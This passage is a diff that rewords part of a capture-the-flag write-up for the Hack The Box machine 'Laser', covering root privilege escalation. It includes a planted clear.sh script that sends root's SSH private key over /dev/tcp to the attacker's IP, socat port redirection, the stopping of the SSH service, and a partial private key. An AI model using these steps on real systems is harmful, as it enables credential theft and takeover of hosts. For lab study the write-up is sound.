 solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/tmp/docker
@@ -1518,31 +1514,31 @@ root@172.18.0.2's password:
 docker
 ```
 
-Since there seemed to be plenty of free space elsewhere in the filesystem I copied the file to `/tmp` instead.
+Since there was plenty of free space elsewhere on the filesystem, I copied the file to `/tmp` instead.
 
 ```text
 solr@laser:~$ docker images
 Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/images/json: dial unix /var/run/docker.sock: connect: permission denied
 ```
 
-Unfortunately while trying to use this to escalate privileges I ran into two problems: the service was not running on the container and I couldn't start it because I didn't have privileges to work with containers on the host.
+Unfortunately, trying to use this for privilege escalation hit two snags: the service wasn't running in the container, and I couldn't start it because I lacked the privileges to manage containers on the host.
 
 ### clear.sh
 
-I went back to reading some of the output I had gotten from my memory reading script to see if I noticed anything else that was useful.
+I revisited the output from my memory-reading script to see if anything else stood out.
 
 ```text
 'sshpass\x00-p\x00zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\x00ssh\x00root@172.18.0.2\x00/tmp/clear.sh\x00'
 ```
 
-While running my python script to find the password \(before I put the check for zzz's\) I noticed another process being run by `sshpass` that was executing a script `clear.sh` in the `/tmp` directory.  At first I thought it was trying to run the script from the container, but a closer look revealed that there was a separator `\x00` between `root@172.18.0.2` and `/tmp/clear.sh`.  This meant that the command was trying to log in to the container as root, then run the `clear.sh` script from the host's `/tmp` folder.
+While running my password-hunting script \(before adding the zzz check\) I noticed another `sshpass` process running a script called `clear.sh` from `/tmp`.  At first I assumed it ran the script inside the container, but on closer inspection there was a `\x00` separator between `root@172.18.0.2` and `/tmp/clear.sh`.  That meant the command logged into the container as root and then executed the `clear.sh` script from the host's `/tmp` folder.
 
 ```text
 solr@laser:/tmp$ vim /tmp/clear.sh
 solr@laser:/tmp$ chmod +x /tmp/clear.sh
 ```
 
-I checked the `/tmp` directory to see what this script did, but there was no script there.  This seemed like a perfect opportunity for me to supply one for them.  I made a script to copy `root`'s SSH key to my machine, since the process was running in the context of root \(verified by checking `ps aux` again\).  
+I looked in `/tmp` to see what the script did, but no such script was there.  That looked like the perfect chance to supply one of my own.  Since the process ran as root \(confirmed via another `ps aux`\), I wrote a script to exfiltrate `root`'s SSH key to my machine.  
 
 ```bash
 #! /bin/bash
@@ -1550,9 +1546,9 @@ I checked the `/tmp` directory to see what this script did, but there was no scr
 cat /root/.ssh/id_rsa > /dev/tcp/10.10.15.98/9099
 ```
 
-My bash script was very simple, and just copied `root`'s SSH to my machine using TCP sockets
+My bash script was dead simple, just shipping `root`'s SSH key to my machine over TCP sockets
 
-Since the process that was running the `clear.sh` script on the machine was owned by root, and since it was trying to run by connecting to port 22 on the container, I figured I needed a way to redirect that connection back to the local machine since there was no script named `clear.sh` there in the `/tmp` directory. This would give me the perfect opportunity to supply one for them for my own purposes.  After doing some research on how to redirect ports without using SSH, I found the easiest way was by using `socat`.  
+Since the process running `clear.sh` was owned by root and was reaching the container over port 22, and since no `clear.sh` existed in the container's `/tmp`, I needed a way to redirect that connection back to the local machine. That would let me plant my own script for my purposes.  After researching how to forward ports without SSH, I found the simplest approach was `socat`.  
 
 * [https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https)
 
@@ -1561,14 +1557,14 @@ root@20e3289bc183:/tmp# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:2
 2020/12/19 23:13:20 socat[1919] E bind(5, {AF=2 0.0.0.0:22}, 16): Address already in use
 ```
 
-Using `socat` I tried to redirect port 22 traffic from the container to the host so it would execute but the port was already in use \(by SSH\).
+With `socat` I tried forwarding port 22 traffic from the container to the host so it would run, but the port was already in use \(by SSH\).
 
 ```text
 root@20e3289bc183:~# service ssh stop
  * Stopping OpenBSD Secure Shell server sshd                                                     [ OK ]
 ```
 
-Next, I stopped the SSH service to clear the port.
+So I stopped the SSH service to free up the port.
 
 ```text
 solr@laser:/dev/shm$ ssh root@172.18.0.2
@@ -1590,13 +1586,13 @@ Keyboard-interactive authentication is disabled to avoid man-in-the-middle attac
 root@172.18.0.2: Permission denied (publickey,password).
 ```
 
-For some reason I was unable to SSH in at one point while fixing up everything \(it took me a number of tries to get it to work properly, as there was something causing the connection to the container to timeout after a short time!\).  Running the command it mentioned in the error message:`ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"` cleared the error and allowed me to log in again.
+At one point while sorting everything out I couldn't SSH in \(it took several tries to get working, since something kept timing out the connection to the container after a short while!\).  Running the command from the error message, `ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"`, cleared it and let me log back in.
 
 ```text
 root@20e3289bc183:~# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
 ```
 
-The process that would run my malicious `clear.sh` also deleted my file, so I had to keep putting it back in place.  After recreating the script I started the `socat` redirect again.
+The process that executed my malicious `clear.sh` also removed the file afterward, so I had to keep recreating it.  After putting the script back, I restarted the `socat` redirect.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/laser]
@@ -1644,7 +1640,7 @@ bgJuljQ7Wp+CYpVpDpxoHgHOZCCdD+WRRlacU/GKkex1gYuoL7iHFVQuBMD6jyjo
 -----END RSA PRIVATE KEY-----
 ```
 
-I received the SSH key back at my waiting listener almost immediately after starting the `socat` redirect!
+The SSH key arrived at my waiting listener almost instantly once the `socat` redirect was running!
 
 ### Root.txt
 
